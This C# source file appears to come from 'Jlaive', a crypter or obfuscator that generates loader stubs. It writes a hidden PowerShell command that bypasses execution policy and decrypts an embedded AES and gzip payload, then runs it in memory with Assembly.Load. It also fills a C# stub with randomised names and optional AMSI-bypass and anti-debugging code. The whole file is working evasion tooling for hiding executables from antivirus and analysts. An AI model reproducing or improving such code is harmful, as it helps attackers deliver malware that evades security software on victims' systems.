using System;
using System.IO;
using System.Reflection;
using System.Text;

using static Jlaive.Utils;

namespace Jlaive
{
    public class StubGen
    {
        public static string CreatePS(byte[] key, byte[] iv, bool hidden, Random rng)
        {
            string varname = RandomString(6, rng);
            string varname2 = RandomString(6, rng);
            string srcvarname = RandomString(6, rng);
            string classname = RandomString(6, rng);
            string functionname = RandomString(6, rng);
            string functionname2 = RandomString(6, rng);
            string srcclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text;using System.IO;using System.IO.Compression;using System.Security.Cryptography; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, byte[] key, byte[] iv) { AesManaged aes = new AesManaged(); aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; ICryptoTransform decryptor = aes.CreateDecryptor(key, iv); byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length); decryptor.Dispose(); aes.Dispose(); return decrypted; } public static byte[] " + functionname2 + @"(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }"));
            return $"%~nx0.exe -noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ${varname} = [System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), [System.Convert]::FromBase64String('{Convert.ToBase64String(key)}'), [System.Convert]::FromBase64String('{Convert.ToBase64String(iv)}')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
        }

        public static string CreateCS(byte[] key, byte[] iv, bool bamsi, bool antidebug, Random rng)
        {
            string namespacename = RandomString(10, rng);
            string classname = RandomString(10, rng);
            string aesfunction = RandomString(10, rng);
            string uncompressfunction = RandomString(10, rng);
            string virtualprotect = RandomString(10, rng);
            string checkremotedebugger = RandomString(10, rng);
            string isdebuggerpresent = RandomString(10, rng);

            string amsiscanbuffer_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key, iv));
            string checkremotedebugger_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key, iv));
            string isdebuggerpresent_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), key, iv));
            string key_str = Convert.ToBase64String(key);
            string iv_str = Convert.ToBase64String(iv);

            Assembly asm = Assembly.GetExecutingAssembly();
            StreamReader reader = new StreamReader(asm.GetManifestResourceStream("Jlaive.Resources.Stub.cs"));
            string stub = string.Empty;
            string stubcode = reader.ReadToEnd();
            reader.Dispose();

            if (bamsi) stub += "#define AMSI_BYPASS\n";
            if (antidebug) stub += "#define ANTI_DEBUG\n";
            stubcode = stubcode.Replace("namespace_name", namespacename);
            stubcode = stubcode.Replace("class_name", classname);
            stubcode = stubcode.Replace("aesfunction_name", aesfunction);
            stubcode = stubcode.Replace("uncompressfunction_name", uncompressfunction);
            stubcode = stubcode.Replace("virtualprotect_name", virtualprotect);
            stubcode = stubcode.Replace("checkremotedebugger_name", checkremotedebugger);
            stubcode = stubcode.Replace("isdebuggerpresent_name", isdebuggerpresent);
            stubcode = stubcode.Replace("amsiscanbuffer_str", amsiscanbuffer_str);
            stubcode = stubcode.Replace("checkremotedebugger_str", checkremotedebugger_str);
            stubcode = stubcode.Replace("isdebuggerpresent_str", isdebuggerpresent_str);
            stubcode = stubcode.Replace("key_str", key_str);
            stubcode = stubcode.Replace("iv_str", iv_str);
            stub += stubcode;

            return stub;
        }
    }
}